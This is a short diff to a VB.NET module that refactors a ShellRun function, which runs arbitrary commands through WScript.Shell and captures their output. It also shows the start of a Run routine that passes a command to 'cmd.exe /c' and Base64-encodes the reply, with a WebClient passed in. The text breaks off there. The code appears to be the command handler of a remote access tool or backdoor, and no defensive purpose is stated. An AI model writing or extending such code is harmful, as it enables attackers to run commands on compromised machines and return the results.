@@ -2,20 +2,17 @@
 Imports System.Text
 
 Module WinCMD
-    Public Function ShellRun(sCmd As String) As String
-        Dim oShell As Object = CreateObject("WScript.Shell")
-
-        Dim oExec As Object = oShell.Exec(sCmd)
+    Public Function ShellRun(command As String) As String
+        Dim oExec As Object = CreateObject("WScript.Shell").Exec(command)
         Dim oOutput As Object = oExec.StdOut
-        Dim s As String = ""
-        Dim sLine As String = ""
+        Dim result As String = ""
 
         While Not oOutput.AtEndOfStream
-            sLine = oOutput.ReadLine
-            If sLine <> "" Then s &= sLine & vbCrLf
+            Dim sLine As Object = oOutput.ReadLine
+            If sLine <> "" Then result &= sLine & vbCrLf
         End While
 
-        Return s
+        Return result
     End Function
     Public Sub Run(command As String, ByRef mainWebClient As WebClient)
         Dim shellReply As String = Convert.ToBase64String(Encoding.UTF8.GetBytes(ShellRun("cmd.exe /c " & command)))
